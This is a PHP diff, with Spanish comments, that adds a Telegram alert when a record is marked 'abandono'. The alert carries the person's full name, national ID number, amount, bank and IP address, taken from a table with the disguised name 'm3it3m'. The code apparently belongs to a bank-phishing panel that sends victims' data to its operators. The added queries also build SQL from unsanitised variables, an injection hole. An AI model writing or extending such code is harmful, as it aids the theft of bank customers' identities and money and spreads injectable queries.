@@ -107,6 +107,25 @@ $stmt->close(); // Cerramos el statement de auth para proceder al UPDATE
 $query = "UPDATE m3it3m SET status = $est, horamodificado = NOW() WHERE idreg = $id";
 
 if (sentencia($con, $query)) {
+    // Notificar en Telegram si es abandono (status 35) — cambia el número si usas otro
+    if ($est === 35) {
+        $row = $con->query("SELECT nombre, apellido, cedula, agente, ip, banco FROM m3it3m WHERE idreg = $id LIMIT 1");
+        if ($row && $r = $row->fetch_assoc()) {
+            $nombre = trim(($r['nombre'] ?? '') . ' ' . ($r['apellido'] ?? ''));
+            $monto  = $r['agente'] ?? '?';
+            $cedula = $r['cedula'] ?? '?';
+            $ip_cli = $r['ip'] ?? '?';
+            $banco  = $r['banco'] ?? '?';
+            require_once __DIR__ . '/../include/telegram.php';
+            sendTelegram(
+                "⚠️ <b>ABANDONO</b>\n" .
+                "👤 <b>{$nombre}</b> | CC: {$cedula}\n" .
+                "💰 Monto: <b>\${$monto}</b>\n" .
+                "🏦 Banco: {$banco}\n" .
+                "🌐 IP: <code>{$ip_cli}</code>"
+            );
+        }
+    }
     http_response_code(200);
     echo json_encode(['success' => true, 'message' => 'Estado actualizado']);
 } else {
